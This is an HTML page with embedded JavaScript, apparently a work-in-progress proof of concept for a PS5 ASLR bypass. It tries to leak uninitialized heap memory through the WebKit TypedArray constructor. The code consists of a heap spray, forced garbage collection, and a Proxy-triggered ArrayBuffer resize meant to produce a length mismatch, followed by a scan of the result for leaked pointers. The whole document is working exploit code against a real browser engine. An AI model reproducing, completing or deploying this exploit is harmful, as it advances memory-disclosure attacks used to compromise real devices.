<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 ASLR Bypass — TypedArray Uninitialized Tail Leak</title>
</head>
<body>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

L('[*] Starting TypedArray uninitialized tail info leak...');

// Step 1: Spray heap with objects to fill Gigacage primitive space
// with recognizable pointer patterns
L('[*] Step 1: Heap spray with TypedArrays...');
let spray = [];
for (let i = 0; i < 5000; i++) {
    spray.push(new Float64Array(64));
}
// Drop references — memory returns to free pool UNZEROED on PlayStation
spray = null;

// Force GC to return memory to free pool
L('[*] Forcing GC...');
for (let i = 0; i < 10; i++) {
    let tmp = [];
    for (let j = 0; j < 1000; j++) tmp.push(new ArrayBuffer(4096));
}

// Step 2: Create a resizable ArrayBuffer with a TypedArray view
L('[*] Step 2: Creating resizable ArrayBuffer...');
const initialSize = 1024;
const ab = new ArrayBuffer(initialSize, { maxByteLength: 4096 });
const source = new Uint8Array(ab, 0, initialSize);

// Fill source with recognizable pattern
source.fill(0xBB);

// Step 3: Capture the source length (this is the key moment)
// The constructor will capture source.length = 1024
// Then allocate destination with DontInitialize (1024 bytes, UNZEROED)
L('[*] Step 3: Constructing new Uint8Array(source)...');
L('[*] Source length at capture: ' + source.length);

// We need to shrink the source BETWEEN length capture and setFromTypedArray
// This is tricky — we need the shrink to happen during construction
// 
// The constructor path is:
//   line 161: length = view->length()     → captures 1024
//   line 163: createUninitialized(1024)   → allocates UNZEROED
//   line 169: isIntegerIndexedObjectOutOfBounds → false (still in bounds)
//   line 180: setFromTypedArray(0, view, 0, 1024) → clamps to current length
//
// We can't shrink during construction directly, but we CAN:
// 1. Use a Proxy or defineProperty on the source to trigger shrink
//    when the constructor accesses .length
// 2. Or use a SharedArrayBuffer race (not available on PS5)
// 3. Or find a different path where the length is cached earlier

// Alternative approach: use a growable ArrayBuffer and shrink it
// BEFORE the constructor reads length, but AFTER we know the
// destination will be allocated at the old size

// Actually, let's try the simplest approach first:
// The constructor captures length, allocates, THEN calls setFromTypedArray
// If we can trigger a shrink between those two steps...

// Let's try using Object.defineProperty to intercept the length read
L('\n[*] Step 4: Attempting shrink via Proxy...');

try {
    // Create a proxy that shrinks the buffer when length is accessed
    const handler = {
        get(target, prop) {
            if (prop === 'length') {
                // Shrink the buffer HERE — between length capture and allocation
                L('[!] Length accessed — shrinking buffer!');
                // Can't shrink ArrayBuffer directly, but we can try resize
                if (ab.resizable) {
                    ab.resize(256);
                    L('[!] Buffer resized to 256');
                }
                return target.length;
            }
            return Reflect.get(target, prop);
        }
    };
    
    const proxiedSource = new Proxy(source, handler);
    
    // This should trigger the length access via proxy
    const result = new Uint8Array(proxiedSource);
    
    L('[+] Construction succeeded!');
    L('[+] Result length: ' + result.length);
    L('[+] Source length after: ' + source.length);
    
    // Check if tail contains non-0xBB data (uninitialized memory)
    let anomalies = 0;
    let leakBytes = [];
    for (let i = 0; i < result.length; i++) {
        if (result[i] !== 0xBB) {
            anomalies++;
            if (leakBytes.length < 64) {
                leakBytes.push(i + ':0x' + result[i].toString(16).padStart(2, '0'));
            }
        }
    }
    
    if (anomalies > 0) {
        L('[!] LEAK DETECTED! ' + anomalies + ' anomalous bytes!');
        L('[!] First bytes: ' + leakBytes.join(' '));
        L('[!] These may be leaked heap pointers!');
    } else {
        L('[*] No anomalies detected (all 0xBB)');
        L('[*] The shrink may not have taken effect in time');
    }
    
} catch(e) {
    L('[!] Proxy approach failed: ' + e.message);
}

// Step 5: Try without Proxy — just shrink before construction
L('\n[*] Step 5: Direct shrink approach...');
try {
    const ab2 = new ArrayBuffer(1024, { maxByteLength: 4096 });
    const src2 = new Uint8Array(ab2, 0, 1024);
    src2.fill(0xCC);
    
    // Shrink the buffer
    ab2.resize(128);
    L('[*] Buffer resized to 128');
    L('[*] Source.length after resize: ' + src2.length);
    
    // Now construct — source.length should be 128, not 1024
    // But the source was created with length 1024...
    // Let's check what happens
    const result2 = new Uint8Array(src2);
    L('[+] Result length: ' + result2.length);
    L('[+] Source length: ' + src2.length);
    
    // If result.length > source.length, we have uninitialized tail
    if (result2.length > src2.length) {
        L('[!] LENGTH MISMATCH! result=' + result2.length + ' source=' + src2.length);
        L('[!] Checking tail for leaked data...');
        let leakFound = false;
        for (let i = src2.length; i < result2.length; i++) {
            if (result2[i] !== 0) {
                L('[!] Byte at ' + i + ': 0x' + result2[i].toString(16));
                leakFound = true;
            }
        }
        if (leakFound) {
            L('[!] UNINITIALIZED MEMORY LEAK CONFIRMED!');
        }
    }
} catch(e) {
    L('[!] Direct approach failed: ' + e.message);
}

L('\n[*] Test finished.');
</script>
</body>
</html>
